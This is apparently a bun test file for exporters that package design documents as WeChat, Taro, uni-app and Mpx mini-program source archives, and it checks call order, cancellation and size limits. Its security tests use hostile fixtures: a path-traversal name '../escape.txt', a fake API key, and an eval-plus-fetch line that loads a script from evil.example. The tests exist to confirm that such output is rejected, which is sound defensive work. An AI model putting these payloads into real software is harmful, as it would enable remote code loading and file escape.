import { describe, expect, test } from 'bun:test'

import { unzipSync } from 'fflate'

import { compile } from '@open-pencil/compiler'
import { SceneGraph } from '@open-pencil/scene-graph'

import {
  exportCurrentDocumentAsMpxSource,
  exportCurrentDocumentAsTaroSource,
  exportCurrentDocumentAsUniAppSource,
  exportCurrentDocumentAsWechatMiniProgramSource,
  type MiniProgramSourceExporter,
  type MiniProgramSourceExporterDependencies
} from '@/app/plugins/host/miniprogram/source-exporter'
import { archiveProjectFiles } from '@/app/plugins/host/project-archive'
import type { SourceExporterEditor } from '@/app/plugins/host/source-exporter-runtime'

interface ExporterFixture {
  marker: string
  name: string
  router: string
  run: MiniProgramSourceExporter
  suffix: string
  target: string
}

const EXPORTERS: readonly ExporterFixture[] = [
  {
    marker: 'app.json',
    name: 'WeChat Mini Program',
    router: 'wechat-native',
    run: exportCurrentDocumentAsWechatMiniProgramSource,
    suffix: 'wechat-miniprogram',
    target: 'wechat-miniprogram'
  },
  {
    marker: 'config/index.ts',
    name: 'Taro',
    router: 'taro-router',
    run: exportCurrentDocumentAsTaroSource,
    suffix: 'taro',
    target: 'taro'
  },
  {
    marker: 'pages.json',
    name: 'uni-app',
    router: 'uni-pages',
    run: exportCurrentDocumentAsUniAppSource,
    suffix: 'uni-app',
    target: 'uni-app'
  },
  {
    marker: 'src/app.mpx',
    name: 'Mpx',
    router: 'mpx-router',
    run: exportCurrentDocumentAsMpxSource,
    suffix: 'mpx',
    target: 'mpx'
  }
]

function editor(documentName = 'Mini Program Demo'): SourceExporterEditor {
  return { graph: new SceneGraph(), state: { documentName } }
}

function dependencies(
  fixture: ExporterFixture,
  capture: { bytes?: Uint8Array; calls: string[] },
  extraFiles: ReadonlyMap<string, string | Uint8Array> = new Map()
): MiniProgramSourceExporterDependencies {
  return {
    async chooseDestination(fileName) {
      capture.calls.push(`choose:${fileName}`)
      return {
        async write(data) {
          capture.calls.push('write')
          capture.bytes = data
        }
      }
    },
    async resolveFontManifest() {
      capture.calls.push('fonts')
      return { faces: [] }
    },
    compile(input) {
      capture.calls.push(`compile:${input.options.target}:${input.options.router}`)
      return {
        files: new Map<string, string | Uint8Array>([
          [fixture.marker, '{}\n'],
          ['README.md', `# ${fixture.name}\n`],
          ...extraFiles
        ]),
        warnings: [
          {
            code: `${fixture.target}-review-required`,
            message: 'Review unsupported authored behavior.'
          }
        ]
      }
    },
    archive: archiveProjectFiles
  }
}

describe('mini-program source project plugin exporters', () => {
  for (const fixture of EXPORTERS) {
    test(`exports a bounded source-only ${fixture.name} archive`, async () => {
      const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
      const result = await fixture.run(editor(), dependencies(fixture, capture))
      if (!capture.bytes) throw new Error(`Expected ${fixture.name} archive bytes`)
      const files = unzipSync(capture.bytes)

      expect(result).toMatchObject({
        fileName: `mini-program-demo-${fixture.suffix}.zip`,
        saved: true
      })
      expect(result.warnings).toHaveLength(1)
      expect(capture.calls).toEqual([
        `choose:mini-program-demo-${fixture.suffix}.zip`,
        'fonts',
        `compile:${fixture.target}:${fixture.router}`,
        'write'
      ])
      expect(files[fixture.marker]).toBeDefined()
      expect(files['EXPORT_WARNINGS.md']).toBeDefined()
      expect(files['node_modules']).toBeUndefined()
    })
  }

  test('accepts the real compiler output for all four reviewed targets', async () => {
    for (const fixture of EXPORTERS) {
      const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
      const realDependencies = dependencies(fixture, capture)
      realDependencies.compile = (input) => {
        capture.calls.push(`compile:${input.options.target}:${input.options.router}`)
        return compile(input)
      }

      const result = await fixture.run(editor(), realDependencies)
      if (!capture.bytes) throw new Error(`Expected real ${fixture.name} archive bytes`)
      const files = unzipSync(capture.bytes)
      expect(result.saved).toBe(true)
      expect(result.fileCount).toBeGreaterThan(1)
      expect(files[fixture.marker]).toBeDefined()
    }
  })

  test('does not enter font resolution or compile when destination selection is cancelled', async () => {
    const calls: string[] = []
    const dependencies: MiniProgramSourceExporterDependencies = {
      async chooseDestination(fileName) {
        calls.push(`choose:${fileName}`)
        return null
      },
      async resolveFontManifest() {
        calls.push('fonts')
        return { faces: [] }
      },
      compile() {
        calls.push('compile')
        return { files: new Map(), warnings: [] }
      },
      async archive() {
        calls.push('archive')
        return new Uint8Array()
      }
    }

    await expect(exportCurrentDocumentAsMpxSource(editor(), dependencies)).resolves.toEqual({
      fileName: 'mini-program-demo-mpx.zip',
      fileCount: 0,
      warnings: [],
      saved: false
    })
    expect(calls).toEqual(['choose:mini-program-demo-mpx.zip'])
  })

  test('honors cancellation before compiling or writing', async () => {
    const calls: string[] = []
    const controller = new AbortController()
    const dependencies: MiniProgramSourceExporterDependencies = {
      async chooseDestination(_fileName, signal) {
        calls.push(`choose:${signal === controller.signal}`)
        controller.abort()
        return {
          async write() {
            calls.push('write')
          }
        }
      },
      async resolveFontManifest() {
        calls.push('fonts')
        return { faces: [] }
      },
      compile() {
        calls.push('compile')
        return { files: new Map(), warnings: [] }
      },
      async archive() {
        calls.push('archive')
        return new Uint8Array()
      }
    }

    await expect(
      exportCurrentDocumentAsWechatMiniProgramSource(editor(), dependencies, controller.signal)
    ).rejects.toMatchObject({ name: 'AbortError' })
    expect(calls).toEqual(['choose:true'])
  })

  test('rejects unsafe compiler paths before writing the archive', async () => {
    for (const fixture of EXPORTERS) {
      const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
      await expect(
        fixture.run(
          editor(),
          dependencies(fixture, capture, new Map([['../escape.txt', 'blocked']]))
        )
      ).rejects.toMatchObject({
        code: 'MINIPROGRAM_ARTIFACT_SECURITY',
        diagnostic: { code: 'unsafe-file-path', source: 'file-path' }
      })
      expect(capture.calls).not.toContain('write')
    }
  })

  test('blocks unsafe output for every exporter before archive or destination write', async () => {
    const secret = `sk-proj-${'s'.repeat(24)}`
    for (const fixture of EXPORTERS) {
      const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
      const unsafeDependencies = dependencies(
        fixture,
        capture,
        new Map([['src/private.ts', `export const token = '${secret}'`]])
      )
      unsafeDependencies.archive = async () => {
        capture.calls.push('archive')
        return new Uint8Array()
      }

      const error = await fixture.run(editor(), unsafeDependencies).catch((cause: unknown) => cause)
      expect(error).toMatchObject({
        code: 'MINIPROGRAM_ARTIFACT_SECURITY',
        diagnostic: { code: 'secret-detected', source: 'text-content' }
      })
      expect(error).toBeInstanceOf(Error)
      expect((error as Error).message).not.toContain(secret)
      expect(capture.calls).not.toContain('archive')
      expect(capture.calls).not.toContain('write')
    }
  })

  test('blocks executable Uint8Array source before archive or destination write', async () => {
    const fixture = EXPORTERS.find(({ target }) => target === 'taro')
    if (!fixture) throw new Error('Missing Taro exporter fixture')
    const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
    const executableBytes = new TextEncoder().encode(
      "eval('remote'); fetch('https://evil.example/runtime.js')"
    )
    const unsafeDependencies = dependencies(
      fixture,
      capture,
      new Map([['src/runtime.js', executableBytes]])
    )
    unsafeDependencies.archive = async () => {
      capture.calls.push('archive')
      return new Uint8Array()
    }

    const error = await fixture.run(editor(), unsafeDependencies).catch((cause: unknown) => cause)
    expect(error).toMatchObject({
      code: 'MINIPROGRAM_ARTIFACT_SECURITY',
      diagnostic: { code: 'unreviewed-binary-artifact', source: 'binary-metadata' }
    })
    expect(capture.calls).not.toContain('archive')
    expect(capture.calls).not.toContain('write')
  })

  test('rejects an oversized generated warning report before archive or write', async () => {
    const fixture = EXPORTERS.find(({ target }) => target === 'taro')
    if (!fixture) throw new Error('Missing Taro exporter fixture')
    const capture: { bytes?: Uint8Array; calls: string[] } = { calls: [] }
    const oversizedDependencies = dependencies(fixture, capture)
    oversizedDependencies.compile = (input) => {
      capture.calls.push(`compile:${input.options.target}:${input.options.router}`)
      return {
        files: new Map([[fixture.marker, '{}\n']]),
        warnings: [
          {
            code: 'taro-review-required',
            message: 'x'.repeat(1024 * 1024)
          }
        ]
      }
    }
    oversizedDependencies.archive = async () => {
      capture.calls.push('archive')
      return new Uint8Array()
    }

    const error = await fixture
      .run(editor(), oversizedDependencies)
      .catch((cause: unknown) => cause)
    expect(error).toMatchObject({
      code: 'MINIPROGRAM_PROJECT_BUDGET',
      diagnostic: {
        code: 'mini-program-text-file-byte-limit',
        path: 'EXPORT_WARNINGS.md',
        target: 'taro'
      }
    })
    expect(capture.calls).not.toContain('archive')
    expect(capture.calls).not.toContain('write')
  })
})
